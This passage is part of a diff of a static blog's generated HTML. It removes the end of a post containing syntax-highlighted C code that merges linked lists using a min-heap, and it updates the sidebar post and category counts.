class="keyword">if</span> (heap[<span class="number">0</span>]-&gt;next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            heap[<span class="number">0</span>] = heap[n - <span class="number">1</span>];</span><br><span class="line">            n--;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            heap[<span class="number">0</span>] = heap[<span class="number">0</span>]-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> parent = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> l_child = <span class="number">2</span> * parent + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> r_child = <span class="number">2</span> * parent + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">int</span> r;</span><br><span class="line">            <span class="keyword">if</span> (l_child &lt; n &amp;&amp; r_child &lt; n) &#123;</span><br><span class="line">                r = heap[l_child]-&gt;val &lt; heap[r_child]-&gt;val ? l_child : r_child;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (l_child &lt; n) &#123;</span><br><span class="line">                r = l_child;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (heap[r]-&gt;val &gt; heap[parent]-&gt;val) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node_p temp = heap[r];</span><br><span class="line">            heap[r] = heap[parent];</span><br><span class="line">            heap[parent] = temp;</span><br><span class="line">            parent = r;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head_ptr-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1110,14 +1148,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">53</span>
+          <span class="site-state-item-count">58</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
